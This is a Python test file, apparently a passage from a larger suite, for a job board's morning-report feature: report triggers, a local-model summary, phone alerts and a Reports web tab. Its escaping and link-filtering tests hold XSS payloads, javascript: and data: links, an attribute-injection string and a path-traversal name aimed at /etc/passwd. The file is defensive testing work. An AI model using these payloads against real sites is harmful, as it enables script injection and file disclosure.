        self.assertIn("# Report", morningreport.read_report(self.reports, "2026-11-11.md"))


# ------------------------------------------------------------------ the queue trigger

class QueueFinished(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="u10-qf-"))
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.reports = self.tmp / "reports"
        self.settings = self.tmp / "report-settings.json"
        self.queues = self.tmp / "queues"

    def fire(self, folder, status, tasks):
        queue_file(self.queues, folder, status, tasks)
        return morningreport.queue_finished(reports=self.reports, settings_path=self.settings,
                                            queues=self.queues, jobs=[done_job(JID1)],
                                            folder=folder)

    def test_a_queue_that_finished_makes_one_report(self):
        entry = self.fire("notes", "finished", [task("t1", "One", "done", JID1)])
        self.assertIsNotNone(entry)
        self.assertEqual(entry["trigger"], "queue")
        self.assertIsNone(self.fire("notes", "finished", [task("t1", "One", "done", JID1)]),
                          "the same queue does not report twice")

    def test_a_queue_that_halted_after_a_failure_makes_one_too(self):
        entry = self.fire("notes", "stopped", [task("t1", "One", "failed", JID2),
                                              task("t2", "Two", "queued")])
        self.assertIsNotNone(entry)
        self.assertIn("blocked", morningreport.read_report(self.reports, entry["name"]))

    def test_a_running_or_cancelled_queue_makes_no_report(self):
        for status in ("running", "cancelled", "ready", "idle"):
            self.assertIsNone(self.fire("notes", status, [task("t1", "One", "done", JID1)]), status)
        self.assertEqual(morningreport.index_of(self.reports), [])

    def test_a_queue_that_is_not_there_makes_no_report(self):
        self.assertIsNone(morningreport.queue_finished(reports=self.reports,
                                                       settings_path=self.settings,
                                                       queues=self.queues, jobs=[], folder="notes"))
        self.assertIsNone(morningreport.queue_finished(reports=self.reports,
                                                       settings_path=self.settings,
                                                       queues=self.queues, jobs=[], folder=""))


# ------------------------------------------------------------------ the model paragraph

class ModelParagraph(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="u10-model-"))
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.reports = self.tmp / "reports"
        self.settings = self.tmp / "report-settings.json"

    def test_an_idle_loaded_model_adds_a_labelled_paragraph(self):
        asked = []

        def model(facts):
            asked.append(facts)
            return "Two jobs went through; one needs your eye."
        entry = morningreport.make(reports=self.reports, settings_path=self.settings,
                                   jobs=[done_job(), failed_job()], force=True, model=model)
        md = morningreport.read_report(self.reports, entry["name"])
        self.assertIn("## Qwen's summary", md)
        self.assertIn("_Written by the local model; the facts above come from the job records._", md)
        self.assertIn("Two jobs went through", md)
        self.assertEqual(len(asked), 1, "asked once per report")
        self.assertIn("## Needs you", asked[0], "the model is shown the facts, not asked for them")
        self.assertNotIn("Qwen's summary", asked[0].split("## Needs you")[0])

    def test_a_busy_model_is_not_asked_at_all(self):
        calls = []

        def call(body):
            calls.append(body)
            return "should never be written"
        self.assertIsNone(morningreport.qwen_summary("facts", status="loaded", busy=True, call=call))
        self.assertEqual(calls, [])
        entry = morningreport.make(reports=self.reports, settings_path=self.settings,
                                   jobs=[done_job()], force=True,
                                   model=lambda f: morningreport.qwen_summary(
                                       f, status="loaded", busy=True, call=call))
        md = morningreport.read_report(self.reports, entry["name"])
        self.assertNotIn("Qwen's summary", md)

    def test_a_model_that_is_not_loaded_is_not_asked(self):
        for status in ("offline", "loading", "error", ""):
            self.assertIsNone(morningreport.qwen_summary("facts", status=status,
                                                         call=lambda b: "x"), status)

    def test_ask_model_off_never_asks(self):
        morningreport.save(self.settings, morningreport.ReportSettings(ask_model=False))
        asked = []
        morningreport.make(reports=self.reports, settings_path=self.settings, jobs=[done_job()],
                           force=True, model=lambda f: asked.append(1) or "nope")
        self.assertEqual(asked, [])

    def test_a_model_that_says_nothing_adds_no_heading(self):
        for answer in (None, "", "   ", "   \n  "):
            entry = morningreport.make(reports=self.reports, settings_path=self.settings,
                                       jobs=[done_job()], force=True, model=lambda f, a=answer: a)
            md = morningreport.read_report(self.reports, entry["name"])
            self.assertNotIn("Qwen's summary", md, repr(answer))

    def test_a_model_that_raises_or_garbles_is_dropped(self):
        def boom(facts):
            raise RuntimeError("the server hung up")
        entry = morningreport.make(reports=self.reports, settings_path=self.settings,
                                   jobs=[done_job()], force=True, model=boom)
        self.assertIsNotNone(entry)
        self.assertNotIn("Qwen's summary", morningreport.read_report(self.reports, entry["name"]))

    def test_the_summary_is_short_and_on_one_line(self):
        long = "yes. " * 400 + "\n\nand a second paragraph"
        out = morningreport.qwen_summary("facts", status="loaded", call=lambda b: long)
        self.assertLessEqual(len(out), 700)
        self.assertNotIn("\n", out)

    def test_the_answer_is_read_from_the_model_server_reply(self):
        """The paragraph comes out of choices[0].message.content - the same reply shape every
        other model call in this tool uses - proved against a local server, never 8080."""
        seen = {}

        class H(http.server.BaseHTTPRequestHandler):
            def do_POST(self):
                n = int(self.headers.get("Content-Length", "0") or 0)
                seen.update(json.loads(self.rfile.read(n) or b"{}"))
                data = json.dumps({"choices": [{"message": {"content": "One job failed: the tests."}}]}).encode()
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

            def log_message(self, *a):
                pass

        srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), H)
        thr = threading.Thread(target=srv.serve_forever, daemon=True)
        thr.start()
        url = "http://127.0.0.1:%d/v1/chat/completions" % srv.server_address[1]
        try:
            with mock.patch.object(vision, "http_call", _REAL_HTTP):
                out = morningreport.qwen_summary("## Needs you\n- \u26d4 fix the login",
                                                 status="loaded", url=url, timeout=10)
        finally:
            srv.shutdown()
            srv.server_close()
            thr.join(timeout=5)
        self.assertEqual(out, "One job failed: the tests.")
        self.assertIn("## Needs you", seen["messages"][0]["content"], "it is shown the facts")
        self.assertNotIn("Qwen's summary", seen["messages"][0]["content"])

    def test_a_model_that_answers_with_nothing_useful_is_no_paragraph(self):
        for answer in ("", "   ", None, {}, 42, []):
            self.assertIsNone(morningreport.qwen_summary("facts", status="loaded",
                                                         call=lambda b, a=answer: a), repr(answer))

    def test_no_report_in_this_file_ever_reaches_the_model_server(self):
        self.assertEqual(_http_calls, [])


# ------------------------------------------------------------------ the phone alert (9b)

class ReportPush(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="u10-push-"))
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.reports = self.tmp / "reports"
        self.settings = self.tmp / "report-settings.json"
        self.notify = self.tmp / "notify-settings.json"

    def test_a_made_report_is_pushed_to_the_phone_with_counts_only(self):
        notifycfg.save(self.notify, notify.NotifySettings(server="http://box:2586",
                                                          topic="aj-report-topic-1", token="tk",
                                                          **daylight()))
        sent = []

        def post(server, body, token):
            sent.append(body)
        with mock.patch.object(notify, "_post", post):
            entry = morningreport.make(reports=self.reports, settings_path=self.settings,
                                       notify_path=self.notify,
                                       jobs=[done_job(), failed_job(), stop_job()], force=True)
            self.assertIsNotNone(entry)
            self.assertTrue(wait_for(lambda: sent), "the report tells the phone it is ready")
        self.assertEqual(sent[0]["title"], "Morning report ready")
        self.assertEqual(sent[0]["tags"], ["sunrise"])
        self.assertIn("1 done, 2 failed since", sent[0]["message"])
        self.assertIn("2 waiting for you", sent[0]["message"])
        for dirt in ("Add the export button", "Traceback", "curl", "evil.example"):
            self.assertNotIn(dirt, json.dumps(sent[0]), dirt)

    def test_the_push_lines_are_counts_for_the_window(self):
        now = time.time()
        facts = morningreport.gather([done_job(), failed_job(), stop_job()], None,
                                     now - 3600, now)[0]
        lines = morningreport.push_lines(facts, [], now - 3600)
        self.assertEqual(len(lines), 2)
        self.assertIn("1 done, 2 failed since", lines[0])
        self.assertIn("2 waiting for you", lines[1])
        merged = morningreport.gather([done_job(decision_log=[{"kind": "merge"}])], None,
                                      now - 3600, now)[0]
        with_bench = morningreport.push_lines(merged, [{"label": "d6"}], now - 3600)
        self.assertIn("1 bench sets finished", with_bench[1])
        empty = morningreport.push_lines(merged, [], now - 3600)
        self.assertIn("Nothing needs you", empty[1])

    def test_a_report_with_no_phone_set_up_sends_nothing(self):
        notifycfg.save(self.notify, notify.NotifySettings())
        morningreport.make(reports=self.reports, settings_path=self.settings,
                           notify_path=self.tmp / "nowhere" / "notify-settings.json",
                           jobs=[done_job()], force=True)     # must not raise
        self.assertEqual(_post_calls, [])


# ------------------------------------------------------------------ the HTML

class ReportHtml(unittest.TestCase):
    def test_a_report_reads_as_headings_lists_and_links(self):
        html = morningreport.md_html("# Morning report \u2013 Tue\n\n## Needs you\n\n"
                                     "- \u26d4 [Fix the login](/jobs/2026-01-01-00-a1)\n\n"
                                     "1 done, 0 failed \u00b7 20 min\n")
        self.assertIn("<h1>Morning report \u2013 Tue</h1>", html)
        self.assertIn("<h2>Needs you</h2>", html)
        self.assertIn('<a href="/jobs/2026-01-01-00-a1">Fix the login</a>', html)
        self.assertIn("<ul><li>", html)
        self.assertTrue(html.endswith("</ul>") or "</ul>" in html)

    def test_the_bundle_path_becomes_a_link(self):
        html = morningreport.md_inline("Fix the export \u2013 export for review: "
                                       "/api/jobs/2026-01-01-00-a1/bundle")
        self.assertIn('<a href="/api/jobs/2026-01-01-00-a1/bundle">Export for review</a>', html)

    def test_html_written_into_a_record_is_escaped(self):
        for dirty in ('<script>alert(1)</script>', '<img src=x onerror=alert(1)>'):
            html = morningreport.md_html(f"- \u2717 {dirty} failed\n")
            self.assertNotIn("<script", html)
            self.assertNotIn("<img", html)
            self.assertIn("&lt;" + dirty[1:6], html)     # it reads as text, not as a tag

    def test_a_link_only_goes_somewhere_this_board_can_answer(self):
        self.assertNotIn("<a", morningreport.md_inline("[x](javascript:alert(1))"))
        self.assertNotIn("<a", morningreport.md_inline("[x](data:text/html;base64,PHN2Zz4=)"))
        self.assertNotIn("<a", morningreport.md_inline("[x](//evil.example/x)"))
        self.assertNotIn("<a", morningreport.md_inline('[y](" onmouseover="bad)'))
        self.assertIn('<a href="/jobs/a1">y</a>', morningreport.md_inline("[y](/jobs/a1)"))
        self.assertIn('<a href="http://192.168.1.20:8091/jobs/a1"',
                      morningreport.md_inline("[y](http://192.168.1.20:8091/jobs/a1)"))

    def test_a_report_page_carries_the_text_and_a_way_back(self):
        tmp = Path(tempfile.mkdtemp(prefix="u10-html-"))
        self.addCleanup(shutil.rmtree, tmp, ignore_errors=True)
        (tmp / "2026-11-11.md").write_text("# Morning report\n\n- \u2713 Fixed it\n", encoding="utf-8")
        body = morningreport.report_body(tmp, "2026-11-11.md")
        self.assertIn("<h1>Morning report</h1>", body)
        self.assertIn('href="/reports"', body)
        self.assertIn("Raw text", body)
        self.assertIsNone(morningreport.report_body(tmp, "../x"))

    def test_the_reports_tab_lists_what_is_saved(self):
        tmp = Path(tempfile.mkdtemp(prefix="u10-page-"))
        self.addCleanup(shutil.rmtree, tmp, ignore_errors=True)
        settings = tmp / "report-settings.json"
        morningreport.save(settings, morningreport.ReportSettings(time="06:30"))
        now = time.time()
        morningreport.save_index(tmp, [{"name": "2026-11-10.md", "day": "2026-11-10", "made": now,
                                        "since": now - 86400, "until": now, "jobs": 4, "bench": 1,
                                        "waiting": 2, "trigger": "clock"}])
        html = morningreport.page_body(tmp, settings, token_field="ajtok", token="t" * 24)
        self.assertIn("The next one comes at 06:30", html)
        self.assertIn("10 Nov 2026", html)
        self.assertIn("4 jobs", html)
        self.assertIn("1 bench set", html)
        self.assertIn("2 waiting for you", html)
        self.assertIn("Make report now", html)
        self.assertIn('name="ajtok" value="' + "t" * 24 + '"', html)
        self.assertIn('name="time" value="06:30"', html)

    def test_an_empty_reports_tab_says_when_the_next_one_comes(self):
        tmp = Path(tempfile.mkdtemp(prefix="u10-empty-"))
        self.addCleanup(shutil.rmtree, tmp, ignore_errors=True)
        html = morningreport.page_body(tmp, tmp / "report-settings.json")
        self.assertIn("No reports yet. The next one comes at 07:00", html)

    def test_the_page_shows_why_a_setting_was_not_saved(self):
        tmp = Path(tempfile.mkdtemp(prefix="u10-err-"))
        self.addCleanup(shutil.rmtree, tmp, ignore_errors=True)
        html = morningreport.page_body(tmp, tmp / "report-settings.json",
                                       errors=["The time must look like 07:00."],
                                       form={"time": ["tea o'clock"]})
        self.assertIn("Not saved", html)
        self.assertIn("The time must look like 07:00.", html)
        self.assertIn('value="tea o&#x27;clock"', html, "what Jason typed comes back, escaped")

    def test_a_read_only_copy_shows_no_button_and_no_form(self):
        tmp = Path(tempfile.mkdtemp(prefix="u10-ro-"))
        self.addCleanup(shutil.rmtree, tmp, ignore_errors=True)
        html = morningreport.page_body(tmp, tmp / "report-settings.json", readonly=True)
        self.assertNotIn("<button", html)
        self.assertNotIn('<form method="post"', html)
        self.assertIn("read-only", html)


# ------------------------------------------------------------------ the live Reports tab

class ReportsPage(unittest.TestCase):
    """jobboard.py's "# U10" hooks on a real board on 127.0.0.1 (its own ports, its own state)."""

    @classmethod
    def setUpClass(cls):
        cls.tmp = Path(tempfile.mkdtemp(prefix="jb10-web-"))
        cls.saved = (jobboard.JOBS, jobboard.WORK, jobboard.PORT, jobboard.READONLY,
                     jobboard.REPORTS, jobboard.REPORT_SETTINGS, jobboard.QUEUES, jobboard.PLANS,
                     jobboard.NOTIFY_FILE, jobboard.ACCESS_FILE, jobboard.running)
        for name in ("jobs", "work", "reports", "queues", "plans"):
            p = cls.tmp / name
            p.mkdir()
            setattr(jobboard, name.upper(), p)
        jobboard.REPORT_SETTINGS = cls.tmp / "report-settings.json"
        jobboard.NOTIFY_FILE = cls.tmp / "notify-settings.json"
        jobboard.ACCESS_FILE = cls.tmp / "access-settings.json"
        jobboard.READONLY = False
        jobboard.running = {}
        cls.port = free_port()
        jobboard.PORT = cls.port
        cls.srv = http.server.ThreadingHTTPServer(("127.0.0.1", cls.port), jobboard.H)
        cls.thr = threading.Thread(target=cls.srv.serve_forever, daemon=True)
        cls.thr.start()

    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown(); cls.srv.server_close(); cls.thr.join(timeout=5)
        (jobboard.JOBS, jobboard.WORK, jobboard.PORT, jobboard.READONLY,
         jobboard.REPORTS, jobboard.REPORT_SETTINGS, jobboard.QUEUES, jobboard.PLANS,
         jobboard.NOTIFY_FILE, jobboard.ACCESS_FILE, jobboard.running) = cls.saved
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def setUp(self):
        """One job record on disk, a plan for the queue-task link, an offline model server."""
        self.sess = ""
        for junk in self.tmp.rglob("*"):
            if junk.is_file():
                junk.unlink()
        jobboard.NOTIFY_FILE = self.tmp / "notify-settings.json"
        self.job = done_job(JID1, finished=time.time() - 120)
        (jobboard.JOBS / JID1).mkdir(parents=True, exist_ok=True)
        jobboard.save_meta(self.job, JID1)
        planning_rec = planning_record("notes")
        (jobboard.PLANS / "notes.json").write_text(json.dumps(planning_rec), encoding="utf-8")
        self.pinger = mock.patch.object(jobboard, "basalt_status", lambda: "offline")
        self.pinger.start()
        self.addCleanup(self.pinger.stop)

    def fetch(self, path, data=None, origin=None, cookie=True):
        body = urllib.parse.urlencode(data).encode() if data is not None else None
        req = urllib.request.Request(f"http://127.0.0.1:{self.port}{path}", data=body,
                                     method="POST" if body is not None else "GET")
        if cookie:
            req.add_header("Cookie", f"jb={jobboard.TOKEN}{self.sess}")
        if origin:
            req.add_header("Origin", origin)
        try:
            with OPENER.open(req, timeout=30) as r:
                return r.status, r.read().decode("utf-8", "replace"), r.headers
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", "replace"), e.headers

    def page(self):
        code, html, hdrs = self.fetch("/reports")
        self.assertEqual(code, 200)
        sid = [v.split("=", 1)[1].split(";")[0] for v in (hdrs.get_all("Set-Cookie") or [])
               if v.startswith("aj=")]
        self.assertTrue(sid, "the page hands out the upgrade 8 session")
        self.sess = "; aj=" + sid[0]
        toks = re.findall(r'name="ajtok" value="([^"]+)"', html)
        self.assertTrue(toks, "every form must carry the form token")
        return html, toks[0]

    def post(self, path, form):
        return self.fetch(path, form, origin=f"http://127.0.0.1:{self.port}")

    def test_the_nav_links_to_the_reports_tab(self):
        code, home, _h = self.fetch("/")
        self.assertEqual(code, 200)
        self.assertIn('<a href="/reports">Reports</a>', home)

    def test_the_tab_needs_the_board_token(self):
        code, _body, _h = self.fetch("/reports", cookie=False)
        self.assertEqual(code, 403)

    def test_the_tab_lists_the_reports_and_offers_the_button(self):
        morningreport.make(reports=jobboard.REPORTS, settings_path=jobboard.REPORT_SETTINGS,
                           jobs=[self.job], force=True, trigger="manual")
        html, tok = self.page()
        self.assertIn("Morning report", html)
        self.assertIn("Make report now", html)
        self.assertIn(datetime.now().strftime("%d %b %Y"), html)
        self.assertIn("1 job", html)
        self.assertIn("1 waiting for you", html)

    def test_the_button_makes_a_report_and_shows_it(self):
        _html, tok = self.page()
        code, _body, hdrs = self.post("/report/now", {"ajtok": tok})
        self.assertEqual(code, 303)
        where = hdrs.get("Location", "")
        self.assertTrue(where.startswith("/reports/20"), where)
        name = where.split("/")[-1]
        self.assertTrue((jobboard.REPORTS / name).is_file())
        code2, body, _h = self.fetch(where)
        self.assertEqual(code2, 200)
        self.assertIn("Add the export button", body)
        self.assertNotIn("Qwen's summary", body)      # the model server is offline here

    def test_the_button_needs_the_session_and_its_own_token(self):
        self.page()
        code, _b, _h = self.post("/report/now", {})
        self.assertEqual(code, 403)
        code, _b, _h = self.post("/report/now", {"ajtok": decisions.token_for(decisions.new_sid())})
        self.assertEqual(code, 403)
        self.assertEqual(morningreport.index_of(jobboard.REPORTS), [])

    def test_a_running_job_means_the_model_is_not_asked(self):
        jobboard.running = {JID1: None}
        try:
            with mock.patch.object(jobboard, "basalt_status", lambda: "loaded"):
                _html, tok = self.page()
                code, _b, _h = self.post("/report/now", {"ajtok": tok})
                self.assertEqual(code, 303)
        finally:
            jobboard.running = {}
        self.assertEqual(_http_calls, [], "a busy GPU is never asked for a summary")
        entries = morningreport.index_of(jobboard.REPORTS)
        body = morningreport.read_report(jobboard.REPORTS, entries[-1]["name"])
        self.assertNotIn("Qwen's summary", body)

    def test_the_settings_form_saves_a_new_time(self):
        _html, tok = self.page()
        code, page, _h = self.post("/report/settings", {"ajtok": tok, "time": "05:15",
                                                        "ask_model": "1"})
        self.assertEqual(code, 303)
        self.assertEqual(morningreport.settings(jobboard.REPORT_SETTINGS).time, "05:15")
        code2, again, _h2 = self.fetch("/reports?ok=1")
        self.assertEqual(code2, 200)
        self.assertIn("The next one comes at 05:15", again)
        self.assertIn("Saved.", again)

    def test_a_bad_time_is_refused_on_the_page(self):
        _html, tok = self.page()
        code, page, _h = self.post("/report/settings", {"ajtok": tok, "time": "half five"})
        self.assertEqual(code, 400)
        self.assertIn("Not saved", page)
        self.assertIn("must look like 07:00", page)
        self.assertFalse(jobboard.REPORT_SETTINGS.exists(), "a typo must not save a setting")

    def test_a_saved_report_is_readable_and_raw(self):
        entry = morningreport.make(reports=jobboard.REPORTS, settings_path=jobboard.REPORT_SETTINGS,
                                   jobs=[self.job], force=True)
        code, body, _h = self.fetch(f"/reports/{entry['name']}")
        self.assertEqual(code, 200)
        self.assertIn("<h1>Morning report", body)
        code2, raw, hdrs = self.fetch(f"/reports/{entry['name']}?raw=1")
        self.assertEqual(code2, 200)
        self.assertIn("# Morning report", raw)
        self.assertIn("markdown", hdrs.get("Content-Type", ""))

    def test_a_strange_report_name_is_a_404_not_a_path(self):
        for name in ("..%2F..%2Fetc%2Fpasswd", "notes", "x.md"):
            code, _b, _h = self.fetch(f"/reports/{name}")
            self.assertEqual(code, 404, name)

    def test_a_report_line_linking_to_a_job_and_to_a_project(self):
        code, _b, hdrs = self.fetch(f"/jobs/{JID1}")
        self.assertEqual(code, 303)
        self.assertEqual(hdrs.get("Location"), f"/job/{JID1}")
        code2, _b2, hdrs2 = self.fetch("/jobs/notes")
        self.assertEqual(code2, 303)
        self.assertEqual(hdrs2.get("Location"), "/project/notes")
        code3, _b3, _h3 = self.fetch("/jobs/nope")
        self.assertEqual(code3, 404)

    def test_a_failed_line_links_to_the_review_bundle_and_that_link_works(self):
        bad = failed_job(JID2, finished=time.time() - 60)
        (jobboard.JOBS / JID2).mkdir(parents=True, exist_ok=True)
        jobboard.save_meta(bad, JID2)
        shutil.copy(ROOT / "tests" / "fixtures" / "failed" / "events.jsonl",
                    jobboard.JOBS / JID2 / "events.jsonl")
        entry = morningreport.make(reports=jobboard.REPORTS, settings_path=jobboard.REPORT_SETTINGS,
                                   jobs=[self.job, bad], force=True)
        md = morningreport.read_report(jobboard.REPORTS, entry["name"])
        self.assertIn(f"export for review: /api/jobs/{JID2}/bundle", md)
        code, body, _h = self.fetch(f"/api/jobs/{JID2}/bundle")
        self.assertEqual(code, 200, body[:300])
        page = self.fetch(f"/reports/{entry['name']}")[1]
        self.assertIn(f'<a href="/api/jobs/{JID2}/bundle">Export for review</a>', page)

    def test_html_a_record_invented_is_escaped_on_the_report_page(self):
        dirty = done_job(job='<script>alert(1)</script>', finished=time.time() - 60)
        jid = "20261111-235900-ff00"
        (jobboard.JOBS / jid).mkdir(parents=True, exist_ok=True)
        jobboard.save_meta({**dirty, "id": jid}, jid)
        entry = morningreport.make(reports=jobboard.REPORTS, settings_path=jobboard.REPORT_SETTINGS,
                                   jobs=jobboard.all_jobs(), force=True)
        code, body, _h = self.fetch(f"/reports/{entry['name']}")
        self.assertEqual(code, 200)
        self.assertNotIn("<script>alert(1)</script>", body)
        self.assertIn("&lt;script&gt;alert(1)&lt;/script&gt;", body)

    def test_the_worker_hook_makes_the_daily_report_once(self):
        morningreport.save(jobboard.REPORT_SETTINGS,
                           morningreport.ReportSettings(time=earlier_today()))
        jobboard.report_tick()
        jobboard.report_tick()
        entries = morningreport.index_of(jobboard.REPORTS)
        self.assertEqual(len(entries), 1, "the worker loop runs every few seconds")
        self.assertEqual(entries[0]["trigger"], "clock")

    def test_the_queue_hook_reports_a_finished_queue_once(self):
        queue_file(jobboard.QUEUES, "notes", "finished", [task("t1", "One", "done", JID1)])
        jobboard.report_queue_finished("notes")
        jobboard.report_queue_finished("notes")
        self.assertEqual(len(morningreport.index_of(jobboard.REPORTS)), 1)
        jobboard.report_queue_finished("")      # a job that is not in a queue
        self.assertEqual(len(morningreport.index_of(jobboard.REPORTS)), 1)

    def test_a_read_only_copy_shows_no_button_and_refuses_both_posts(self):
        jobboard.READONLY = True
        try:
            code, html, _h = self.fetch("/reports")
            self.assertEqual(code, 200)
            self.assertNotIn("<button", html)
            self.assertIn("read-only", html)
            for path in ("/report/now", "/report/settings"):
                code, _b, _h = self.post(path, {"ajtok": "not-your-token", "time": "06:00"})
                self.assertEqual(code, 403, path)
            self.assertEqual(morningreport.index_of(jobboard.REPORTS), [])
        finally:
            jobboard.READONLY = False


def free_port():
    s = socket.socket(); s.bind(("127.0.0.1", 0)); p = s.getsockname()[1]; s.close(); return p


def planning_record(folder):
    """A project record, as planning.py writes it (the /jobs/<folder> alias answers with it)."""
    return {"folder": folder, "name": folder, "kind": "app", "outline": "does the thing",
            "created": time.time() - 600, "plan_job": None, "plan_retries": 0,
            "plan_status": "approved", "approved_at": time.time() - 300, "approved_hash": "abc1234",
            "tasks": [{"id": "t1", "title": "One", "milestone": "M1", "seconds": 600}]}


if __name__ == "__main__":
    unittest.main()
